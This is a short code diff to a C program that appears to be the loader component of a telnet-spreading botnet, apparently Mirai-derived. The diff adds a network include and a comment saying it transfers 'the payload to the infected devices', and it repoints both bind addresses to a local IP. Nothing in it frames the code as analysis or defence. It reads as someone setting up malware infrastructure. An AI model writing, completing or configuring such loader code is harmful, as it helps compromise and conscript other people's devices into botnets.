@@ -6,6 +6,7 @@
 #include <pthread.h>
 #include <sys/socket.h>
 #include <errno.h>
+#include <arpa/inet.h>
 #include "headers/includes.h"
 #include "headers/server.h"
 #include "headers/telnet_info.h"
@@ -17,6 +18,8 @@ static void *stats_thread(void *);
 static struct server *srv;
 
 char *id_tag = "telnet";
+
+// transfer the payload to the infected devices.
 
 int main(int argc, char **args)
 {
@@ -34,8 +37,8 @@ int main(int argc, char **args)
     addrs_len = 2;
     addrs = calloc(addrs_len, sizeof (ipv4_t));
 
-    addrs[0] = inet_addr("192.168.0.1"); // Address to bind to
-    addrs[1] = inet_addr("192.168.1.1"); // Address to bind to
+    addrs[0] = inet_addr("192.168.0.16"); // Address to bind to
+    addrs[1] = inet_addr("192.168.0.16"); // Address to bind to
 #endif
 
     if (argc == 2)
